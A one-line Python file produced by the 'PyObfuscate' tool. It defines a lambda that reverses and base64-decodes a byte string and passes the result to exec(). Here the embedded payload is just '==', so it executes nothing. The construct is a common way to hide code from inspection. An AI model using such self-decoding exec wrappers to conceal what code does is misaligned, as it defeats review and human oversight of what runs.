# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Sat Jun  8 23:27:38 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))